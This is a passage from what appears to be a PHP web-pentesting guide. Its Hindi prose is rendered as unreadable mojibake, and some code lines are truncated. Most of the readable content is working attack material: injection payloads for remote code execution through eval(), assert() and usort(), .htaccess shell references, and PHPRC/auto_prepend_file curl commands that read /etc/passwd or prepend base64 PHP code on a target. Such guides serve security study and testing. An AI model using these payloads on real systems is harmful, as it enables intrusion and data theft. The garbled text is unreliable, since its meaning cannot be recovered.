* **рдПрдХ рд╣реА рдбреЛрдореЗрди рдХреЗ PHPSESSION рдХреБрдХреА рдПрдХ рд╣реА рдЬрдЧрд╣ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдПрдХ рдбреЛрдореЗрди рдХреЗ рднреАрддрд░ **рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкрдереЛрдВ рдореЗрдВ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдХреБрдХреАрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рдЖрдк рдПрдХ рдкрде рдХреЛ **рджреВрд╕рд░реЗ рдкрде рдХреА рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
рдЗрд╕ рддрд░рд╣, рдпрджрд┐ **рджреЛрдиреЛрдВ рдкрдереЛрдВ рдореЗрдВ рдПрдХ рд╣реА рдирд╛рдо рд╡рд╛рд▓реЗ рд╡реЗрд░рд┐рдПрдмрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдЖрдк **рдкрде1 рдореЗрдВ рдЙрд╕ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреА рдорд╛рдиреНрдпрддрд╛ рдкрде2 рдореЗрдВ рд▓рд╛рдЧреВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдФрд░ рдлрд┐рд░ рдкрде2 рдкрде1 рдХреЗ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдорд╛рдиреНрдп рдорд╛рдиреЗрдЧрд╛ (рдкрде2 рдореЗрдВ рдЙрд╕рдХреЗ рд▓рд┐рдП рд╕рдВрдмрдВрдзрд┐рдд рдХреБрдХреА рдХреЛ рджреЗрдХрд░)ред
* рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдорд╢реАрди рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рд╣реЛрдВред рдкрддрд╛ рдХрд░реЗрдВ: **/\~\<USERNAME>** рдХрд┐ рдХреНрдпрд╛ php рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рд╕рдХреНрд░рд┐рдп рд╣реИрдВред
* [**php рд░реИрдкрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ LFI рдФрд░ RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди PHP рдореЗрдВ рдЖрдорддреМрд░ рдкрд░ **рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рд╣реИрд╢ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ** рдФрд░ рд╣реИрд╢ рдХреЗ рд╕рд╛рде рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рд╕рддреНрдпрд╛рдкрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред\
рд╕рдорд░реНрдерд┐рдд рдПрд▓реНрдЧреЛрд░рд┐рджрдо рд╣реИрдВ: `PASSWORD_DEFAULT` рдФрд░ `PASSWORD_BCRYPT` (рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ `$2y$`). рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **PASSWORD\_DEFAULT рдЖрдорддреМрд░ рдкрд░ PASSWORD\_BCRYPT рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрддрд╛ рд╣реИред** рдФрд░ рд╡рд░реНрддрдорд╛рди рдореЗрдВ, **PASSWORD\_BCRYPT** рдореЗрдВ рдЗрдирдкреБрдЯ рдХреА рдЖрдХрд╛рд░ рд╕реАрдорд╛ рд╣реИ 72 рдмрд╛рдЗрдЯреНрд╕ рдХреАред рдЗрд╕рд▓рд┐рдП, рдЬрдм рдЖрдк рдЗрд╕ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЗ рд╕рд╛рде 72 рдмрд╛рдЗрдЯреНрд╕ рд╕реЗ рдмрдбрд╝реА рдХреБрдЫ рд╣реИрд╢ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреЗрд╡рд▓ рдкрд╣рд▓реЗ 72 рдмрд╛рдЗрдЯреНрд╕ рдХрд╛ рд╣реА рдЙрдкрдпреЛрдЧ рд╣реЛрдЧрд╛:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ PHP рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдпрджрд┐ рдПрдХ **PHP рдкреЗрдЬ рддреНрд░реБрдЯрд┐рдпрд╛рдБ рдкреНрд░рд┐рдВрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдХреБрдЫ рдЗрдирдкреБрдЯ рдХреЛ рдЗрдХрд╛рд░реЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд╛рдкрд╕ рджреЗ рд░рд╣рд╛ рд╣реИ**, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ PHP рд╕рд░реНрд╡рд░ рдХреЛ рдХреБрдЫ **рд╕рд╛рдордЧреНрд░реА рдЗрддрдиреА рд▓рдВрдмреА** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЬрдм рдпрд╣ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **рд╣реИрдбрд░реНрд╕ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рд╕рд░реНрд╡рд░ рддреНрд░реБрдЯрд┐ рдЙрдард╛ рджреЗрдЧрд╛ред
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ **рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рд╕рд░реНрд╡рд░ рдХреЛ рдХреБрдЫ рдмрдбрд╝реА рддреНрд░реБрдЯрд┐рдпрд╛рдБ рдЙрдард╛рдИрдВ**, рдФрд░ рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рд╕реНрдХреНрд░реАрди рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрдм php рдиреЗ **рд╣реИрдбрд░ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛**, рддреЛ рдпрд╣ рдирд╣реАрдВ рдХрд░ рд╕рдХрд╛ (рдЗрд╕рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╕реАрдПрд╕рдкреА рд╣реИрдбрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд╣реАрдВ рднреЗрдЬрд╛ рдЧрдпрд╛ рдерд╛):

![](<../../../.gitbook/assets/image (465).png>)

## рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧреА PHP рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рджреЗрдЦреЗрдВ](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" рддрд░реНрдХ рдореЗрдВ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдо рд╕реЗ рдХрдо рдПрдХ рдорд┐рд▓рд╛рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
рдпрд╣ preg\_replace рдХрд╛ рдпрд╣ рд╡рд┐рдХрд▓реНрдк **PHP 5.5.0 рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рдЪрд▓рд┐рдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред**

### **Eval() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Assert()**

рдпрд╣ php рдХреА рдлрд╝рдВрдХреНрд╢рди рдЖрдкрдХреЛ **рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рд▓рд┐рдЦреЗ рдЧрдП рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рддрд╛рдХрд┐ **true рдпрд╛ false рд▓реМрдЯрд╛ рд╕рдХреЗ** (рдФрд░ рдЗрд╕рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдмрджрд▓ рд╕рдХреЗ)ред рдЖрдорддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЪрд░рд┐рддреНрд░ рд╡реЗрд░рд┐рдПрдмрд▓ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдмреАрдЪ рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:\
`assert("strpos($_GET['page']),'..') === false")` --> рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **RCE** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
рдЖрдкрдХреЛ рдХреЛрдб рдХреА рд╕рдВрд░рдЪрдирд╛ рдХреЛ рддреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдлрд┐рд░ рд╕реЗ рд╕рд╣реА рдХрд░рдиреА рд╣реЛрдЧреАред рдЖрдк "**and" рдпрд╛ "%26%26" рдпрд╛ "|"** рдЬреИрд╕реЗ рддрд╛рд░реНрдХрд┐рдХ рд╕рдВрдЪрд╛рд▓рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ "or", "||" рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдкрд╣рд▓реА рд╕реНрдерд┐рддрд┐ рд╕рддреНрдп рд╣реИ рддреЛ рд╣рдорд╛рд░рд╛ рдкреЗрд▓реЛрдб рдирд╣реАрдВ рдЪрд▓реЗрдЧрд╛ред рдЙрд╕реА рддрд░рд╣ ";" рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд╛рд░рд╛ рдкреЗрд▓реЛрдб рдирд╣реАрдВ рдЪрд▓реЗрдЧрд╛ред

**рджреВрд╕рд░рд╛ рд╡рд┐рдХрд▓реНрдк** рд╣реИ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдХрдорд╛рдВрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЬреЛрдбрд╝рдирд╛: `'.highlight_file('.passwd').'`

**рджреВрд╕рд░рд╛ рд╡рд┐рдХрд▓реНрдк** (рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЖрдВрддрд░рд┐рдХ рдХреЛрдб рд╣реИ) рд╣реИ рдХрд┐ рдХреБрдЫ рдЪрд░ рдХреЛ рд╕рдВрдЪрд╛рд▓рди рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЪрд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ: `$file = "hola"`

### **usort() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE**

рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдЗрдЯрдо рдХреЗ рдПрдХ рдПрд░реЗ рдХреЛ рдХреНрд░рдордмрджреНрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
рдЖрдк рдЕрдкрдиреЗ рдХреЛрдб рдХреЗ рдмрд╛рдХреА рд╣рд┐рд╕реНрд╕реЗ рдХреЛ рдЯрд┐рдкреНрдкрдгреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **//** рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдмрдВрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХрд┐рддрдиреЗ рдмреНрд░реИрдХреЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЗрд╕реЗ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП:

* `?order=id;}//`: рд╣рдореЗрдВ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдорд┐рд▓рддрд╛ рд╣реИ (`Parse error: syntax error, unexpected ';'`)ред рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╢рд╛рдпрдж рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдмреНрд░реИрдХреЗрдЯ рдЧрд╛рдпрдм рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред
* `?order=id);}//`: рд╣рдореЗрдВ рдПрдХ **рдЪреЗрддрд╛рд╡рдиреА** рдорд┐рд▓рддреА рд╣реИред рдпрд╣ рд╕рд╣реА рд▓рдЧрддрд╛ рд╣реИред
* `?order=id));}//`: рд╣рдореЗрдВ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдорд┐рд▓рддрд╛ рд╣реИ (`Parse error: syntax error, unexpected ')' i`)ред рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╢рд╛рдпрдж рдмрд╣реБрдд рд╕рд╛рд░реЗ рдмрдВрдж рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдмреНрд░реИрдХреЗрдЯ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

### **.httaccess** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

рдпрджрд┐ рдЖрдк рдПрдХ **.htaccess** рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХрдИ рдЪреАрдЬреЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреЛрдб рднреА рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдРрд╕реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рдЬреЛ .htaccess рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде **рдЪрд▓рд╛ рд╕рдХрддреА рд╣реИрдВ**ред)

рдпрд╣рд╛рдВ [рд╡рд┐рднрд┐рдиреНрди .htaccess рд╢реИрд▓реНрд╕](https://github.com/wireghoul/htshells) рдорд┐рд▓ рд╕рдХрддреА рд╣реИрдВред

### Env Variables рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

рдпрджрд┐ рдЖрдкрдХреЛ PHP рдореЗрдВ **env variables рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХрдордЬреЛрд░реА** рдорд┐рд▓рддреА рд╣реИ (рдФрд░ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреНрдп рдПрдХ рдХрдордЬреЛрд░реА, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЕрдзрд┐рдХ рдЕрдиреБрд╕рдВрдзрд╛рди рдХреЗ рд╕рд╛рде рд╢рд╛рдпрдж рдЗрд╕реЗ рдмрд╛рдЗрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ), рддреЛ рдЖрдк рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **RCE** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): рдпрд╣ env variable рдЖрдкрдХреЛ рдЕрдиреНрдп рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рд╡рд┐рдЪрд┐рддреНрд░ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ)ред
* **`PHPRC`** : PHP рдХреЛ рдЗрд╕рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдвреВрдВрдврдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЖрдорддреМрд░ рдкрд░ `php.ini` рдХрд╣рд▓рд╛рддреА рд╣реИред рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдЦреБрдж рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ `PHPRC` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ PHP рдХреЛ рдЗрд╕реЗ рджрд┐рдЦрд╛рдПрдВред рдПрдХ **`auto_prepend_file`** рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдЬреЛ рджреВрд╕рд░реА рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП PHP рдкреВрд░реНрд╡рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддреА рд╣реИред рдпрд╣ рджреВрд╕рд░реА рдлрд╝рд╛рдЗрд▓ рд╕рд╛рдорд╛рдиреНрдп **PHP рдХреЛрдб рд╣реЛрддреА рд╣реИ, рдЬреЛ рдлрд┐рд░ PHP рд░рдирдЯрд╛рдЗрдо рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрддрд╛ рд╣реИред
1. рд╣рдорд╛рд░реЗ рд╢реИрд▓рдХреЛрдб рд╡рд╛рд▓реА рдПрдХ PHP рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ
2. рджреВрд╕рд░реА рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ, рдЬрд┐рд╕рдореЗрдВ **`auto_prepend_file`** рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ PHP рдкреВрд░реНрд╡рд╕рдВрд╕реНрдХрд░рдг рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдЪрд░рдг 1 рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рд╣реИ
3. `PHPRC` рдЪрд░рдг 2 рдореЗрдВ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕реЗрдЯ рдХрд░реЗрдВред
* рдЗрд╕ рдЪреЗрди рдХреЛ рдХреИрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдЗрд╕ рдкрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рд╕реЗ**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)ред
* **PHPRC** - рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк
* рдпрджрд┐ рдЖрдк **рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдлреНрд░реАрдмреАрдПрд╕рдбреА рдореЗрдВ "рдлрд╝рд╛рдЗрд▓" `/dev/fd/0` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ **`stdin`** рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ `stdin` рдХреЛ рднреЗрдЬреЗ рдЧрдП рдЕрдиреБрд░реЛрдз рдХрд╛ **рдмреЙрдбреА** рд╣реЛрддрд╛ рд╣реИ:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* рдпрд╛ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`allow_url_include`** рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рдФрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рд╛рде **рдмреЗрд╕64 PHP рдХреЛрдб** рдХреЛ рдкреНрд░реАрдкреЗрдВрдб рдХрд░реЗрдВ:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* рддрдХрдиреАрдХ [**рдЗрд╕ рд░рд┐рдкреЛрд░реНрдЯ рд╕реЗ**](https://vulncheck.com/blog/juniper-cve-2023-36845)ред

## PHP рд╕реНрдерд┐рд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг

рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЗрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдХреЙрд▓ рдореЗрдВ рдХреЛрдб рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣рд╛рдВ рд╕реЗ): [рдпрд╣рд╛рдВ](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)ред
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
рдпрджрд┐ рдЖрдк рдПрдХ PHP рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдбреАрдмрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк `/etc/php5/apache2/php.ini` рдореЗрдВ `display_errors = On` рдЬреЛрдбрд╝рдХрд░ рддреНрд░реБрдЯрд┐ рдкреНрд░рд┐рдВрдЯ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрд╛рдЪреА рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░реЗрдВ: `sudo systemctl restart apache2`

### PHP рдХреЛрдб рдХреЛ рдбреАрдСрдмрдлрд╕реНрдХреЗрдЯ рдХрд░рдирд╛

рдЖрдк рд╡реЗрдм [www.unphp.net](http://www.unphp.net) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ PHP рдХреЛрдб рдХреЛ рдбреАрдСрдмрдлрд╕реНрдХреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## PHP Wrappers рдФрд░ Protocols

PHP Wrappers рдФрд░ Protocols рдЖрдкрдХреЛ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдФрд░ рдкрдврд╝рдиреЗ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫреЛрдбрд╝рдХрд░ рдЙрд╕реЗ рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред [рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреЗрдЬ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug рдЕрдирдЕрдереЗрдВрдЯрд┐рдХреЗрдЯреЗрдб RCE

рдпрджрд┐ рдЖрдк рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ `phpconfig()` рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ **Xdebug** рд╕рдХреНрд╖рдо рд╣реИ, рддреЛ рдЖрдкрдХреЛ [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

## Variable variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE рдирдП $\_GET\["a"]\($\_GET\["b"]) рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛

